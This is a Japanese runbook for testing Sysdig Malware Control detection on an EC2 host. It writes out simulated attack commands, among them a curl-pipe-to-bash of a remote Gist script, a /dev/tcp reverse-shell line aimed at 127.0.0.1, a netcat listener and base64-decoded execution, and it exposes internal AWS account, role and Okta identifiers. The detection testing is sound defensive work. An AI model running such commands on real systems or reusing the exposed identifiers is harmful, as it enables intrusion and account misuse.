# Sysdig Malware Control 動作検証 手動手順書

## 概要

Sysdig Malware Control Runtime Policy の動作を確認するための手動手順書。

**重要な前提知識：**
- Malware Control は**ファイルの中身（EICAR等）ではなく「実行の振る舞い」**を検知する
- EICARファイルを作るだけでは検知されない（実行が必要）
- デフォルト Falco ルールはコンテナ内の挙動を主対象としているため、ホスト上では別途設定が必要
- Sysdig Secure Runtime Policy を使うと、ホスト上の挙動も検知対象になる

---

## 環境情報

| 項目 | 値 |
|------|-----|
| EC2 Instance ID | `i-04642f55475b7c0c7` |
| EC2 Public IP | `13.230.96.54` |
| EC2 ホスト名（内部） | `ip-10-0-1-71.ap-northeast-1.compute.internal` |
| リージョン | `ap-northeast-1`（東京） |
| SSH鍵 | `~/.ssh/sysdig-malware-test-key.pem` |
| セキュリティグループ | `sg-0f71b8e968726bf3a` |
| AWSプロファイル | `draios-dev-developer` |

---

## Step 1: AWS 認証（Okta SSO）

PC再起動後や認証切れの際は最初に実施する。

```bash
okta-aws-cli web \
  --org-domain sysdig.okta.com \
  --oidc-client-id 0oaqz1xwwzHyCiV7A357 \
  --aws-acct-fed-app-id 0oaltf406vJIPOhrY356 \
  --profile draios-dev-developer \
  --write-aws-credentials \
  -i arn:aws:iam::230446364776:saml-provider/OKTA \
  -r arn:aws:iam::230446364776:role/ADMIN_OKTA_TEST \
  -s 3600 -b
```

ブラウザが開いてOktaログイン画面が表示される → 認証する。

**認証確認：**

```bash
aws ec2 describe-instances \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --instance-ids i-04642f55475b7c0c7 \
  --query 'Reservations[0].Instances[0].State.Name' \
  --output text
```

`running` と表示されれば認証OK。

---

## Step 2: セキュリティグループのSSH許可IP更新

PC再起動やネットワーク切替後はIPが変わるため毎回確認する。

### 現在のIPを確認

```bash
curl -s https://checkip.amazonaws.com
```

例：`221.113.81.87` が表示される。

### 現在のSSH許可IPを確認

```bash
aws ec2 describe-security-groups \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --group-ids sg-0f71b8e968726bf3a \
  --query 'SecurityGroups[0].IpPermissions[?FromPort==`22`].IpRanges[].CidrIp' \
  --output text
```

### 古いIPを削除して新しいIPを追加

`OLD_IP` と `NEW_IP` を実際の値に置き換えて実行する。

```bash
# 古いIPのルールを削除
aws ec2 revoke-security-group-ingress \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --group-id sg-0f71b8e968726bf3a \
  --protocol tcp \
  --port 22 \
  --cidr <OLD_IP>/32

# 現在のIPを追加
aws ec2 authorize-security-group-ingress \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --group-id sg-0f71b8e968726bf3a \
  --protocol tcp \
  --port 22 \
  --cidr <NEW_IP>/32
```

---

## Step 3: EC2 に SSH 接続

```bash
ssh -i ~/.ssh/sysdig-malware-test-key.pem \
  -o StrictHostKeyChecking=no \
  ec2-user@13.230.96.54
```

---

## Step 4: Sysdig Agent の状態確認

SSH接続後、以下を順番に実行する。

### ① Agent 起動確認

```bash
sudo systemctl status dragent
```

**期待結果：**

```
● dragent.service - Sysdig Agent
   Active: active (running)
```

`inactive` または `failed` の場合：

```bash
sudo systemctl start dragent
sudo systemctl status dragent
```

### ② Runtime 機能の有効確認

```bash
sudo grep -A3 -E 'feature:|security:|falco:' /opt/draios/etc/dragent.yaml
```

**期待結果：**

```yaml
feature:
  mode: secure

security:
  enabled: true

falco:
  enabled: true
```

`enabled: false` の場合は `/opt/draios/etc/dragent.yaml` を編集して `true` に変更後、Agent を再起動する。

```bash
sudo systemctl restart dragent
```

### ③ Collector 接続確認

```bash
sudo grep -i "connect\|POLICIES" /opt/draios/logs/draios.log | tail -10
```

**期待結果（いずれかが含まれていればOK）：**

```
Connected to collector
POLICIES_V2
```

**エラーの場合のキーワード：**

```
Connection failed
TLS error
Authentication failed
```

---

## 検知結果サマリー（サーバ環境・カスタムルールなし）

| パターン | 検知 | 検知イベント名 |
|---------|:----:|--------------|
| `/var/tmp` スクリプト実行 | ✅ | Execution from Temporary Filesystem |
| curl \| bash（外部URL） | ✅ | Python HTTP Server Started |
| netcat 待受 | ✅ | Suspicious Listener Execution Detected / Launch Suspicious Network Tool on Host |
| `/tmp` スクリプト実行 | ❌ | デフォルトルール対象外 |
| Base64デコード実行 | ❌ | ホスト上はルールなし（カスタムルール追加で対応可） |
| 疑似リバースシェル | ❌ | localhost宛のため通信系ルール未反応 |

---

## Step 5: 検証パターンの実行

以下の6パターンを順番に実行する。各パターン実行後、**30〜60秒待って**から Sysdig Secure コンソールを確認する。

> **注意：** すべて安全な動作確認用コマンドです。実害はありません。

---

### パターン① 一時ディレクトリからのスクリプト実行

> **注意：** `/tmp` はデフォルト Falco ルールの対象外のため検知されない。`/var/tmp` または `/dev/shm` を使うこと。

```bash
# /var/tmp から実行（Falco デフォルトルール対象）
echo -e '#!/bin/bash\necho hello from var/tmp' > /var/tmp/test.sh
chmod +x /var/tmp/test.sh
/var/tmp/test.sh

# /dev/shm から実行（共有メモリ領域、マルウェアが証拠隠滅目的でよく使う）
echo -e '#!/bin/bash\necho hello from dev/shm' > /dev/shm/test.sh
chmod +x /dev/shm/test.sh
/dev/shm/test.sh

# クリーンアップ
rm -f /var/tmp/test.sh /dev/shm/test.sh
```

**狙い：** 一時ディレクトリからの実行、短命スクリプトの起動

| ディレクトリ | 検知 | 備考 |
|------------|------|------|
| `/tmp` | ❌ | 一般的な一時領域のため除外されている |
| `/var/tmp` | ✅ | `Execution from Temporary Filesystem` ルール対象 |
| `/dev/shm` | ✅ | 共有メモリ領域、ディスクに書き込まれないため証拠隠滅に悪用される |

---

### パターン② curl | bash（ネットワーク経由コード実行）

> **注意：** `https://example.com` はHTMLを返すためbashが構文エラーになり実行まで到達しない。GitHub Gistの無害なテストスクリプトを使うこと。

```bash
curl -s https://gist.githubusercontent.com/higakikeita/7fdbbde32cf7e0485e1973dd0d9ddd03/raw | bash
```

**狙い：** 外部からスクリプトをダウンロードして即実行、マルウェア初動の代表パターン

---

### パターン③ Base64 デコード実行（難読化）

```bash
echo 'ZWNobyBoZWxsbw==' | base64 -d | bash
```

> 中身は `echo hello` なので無害。

**狙い：** 難読化されたコードの実行パターン

---

### パターン④ 疑似リバースシェル（/dev/tcp）

```bash
timeout 2 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

> 127.0.0.1 宛のため外部通信なし。`Connection refused` が出るが正常（コマンドパターンを検知させるのが目的）。

**狙い：** C2通信風の挙動、リバースシェルの典型パターン

---

### パターン⑤ netcat 待受

```bash
timeout 5 nc -lvp 4444 &
sleep 2
kill %1 2>/dev/null
```

> バックグラウンド起動 → 2秒後に停止。

**狙い：** 不審ポート待受、バックドア・横展開ツールの挙動

---

### パターン⑥ 権限昇格 + 一時ディレクトリ実行

```bash
echo '#!/bin/bash
echo "Privileged execution from /tmp"' | sudo tee /tmp/priv_test.sh
sudo chmod +x /tmp/priv_test.sh
sudo /tmp/priv_test.sh
```

**狙い：** sudo + 一時ディレクトリの組み合わせ、侵害後アクションの典型

---

### クリーンアップ

```bash
rm -f /tmp/test.sh /tmp/priv_test.sh
```

---

## Step 6: Sysdig Secure コンソールで結果確認

### 確認手順

1. Sysdig Secure にログイン
   - US: `https://secure.sysdig.com/`
   - US West: `https://us2.app.sysdig.com/`

2. **Threats → Events** に移動

3. フィルタ設定：
   - **Category**: Runtime
   - **Severity**: All（重要：Low を除外しない）
   - **Time Range**: Last 15 minutes

4. ホスト名 `ip-10-0-1-71` のイベントを確認

### 期待される検知イベント

| イベント種別 | 対応パターン |
|------------|------------|
| Process execution from /tmp | ①⑥ |
| Base64 encoded command execution | ③ |
| Suspicious network activity | ②③ |
| Reverse shell / /dev/tcp | ④ |
| Netcat execution | ⑤ |
| Privileged execution from /tmp | ⑥ |

### 確認すべきフィールド

| フィールド | 期待値 |
|-----------|-------|
| Policy Name | `Malware Control` |
| Host | `ip-10-0-1-71.ap-northeast-1.compute.internal` |
| Timestamp | 検証実行時刻の前後（〜2分以内） |

---

## トラブルシューティング

### イベントが検知されない場合

#### 確認1: Policy の Scope 設定（最重要）

Sysdig Secure コンソール：
**Policies → Runtime Policies → Malware Control → Scope タブ**

| 設定例 | 状態 |
|--------|------|
| `host.hostName != ""` | ✅ 全ホスト対象 |
| `host.hostName contains "ip-10-0-1-71"` | ✅ 対象ホスト含む |
| `host.hostName = "ip-xxx"` | ❌ 別ホストのみ対象 |

#### 確認2: Policy の有効化

**Policies → Runtime Policies → Malware Control**

- ✅ **Status**: Enabled
- ✅ **Action**: Detect または Prevent

#### 確認3: Inventory でホスト確認

**Sysdig Secure → Inventory → Hosts**

- `ip-10-0-1-71` が表示されている
- Status が **Connected（緑）** になっている

#### 確認4: イベントの Severity フィルタ

Events 画面で Severity フィルタが **All** になっているか確認する。
`Low` が除外されていると見落とす。

---

## 検証後のクリーンアップ（検証環境を終了する場合）

```bash
# EC2 インスタンスを停止（削除する場合は terminate-instances）
aws ec2 stop-instances \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --instance-ids i-04642f55475b7c0c7

# または削除
aws ec2 terminate-instances \
  --profile draios-dev-developer \
  --region ap-northeast-1 \
  --instance-ids i-04642f55475b7c0c7
```

---

## 参考

- [Sysdig Runtime Policies ドキュメント](https://docs.sysdig.com/en/docs/sysdig-secure/policies/threat-detect-policies/)
- [Falco Rules](https://github.com/falcosecurity/rules)
- 検証結果レポート（過去実施分）: `~/falco-detection-tests/VERIFICATION_RESULTS.md`
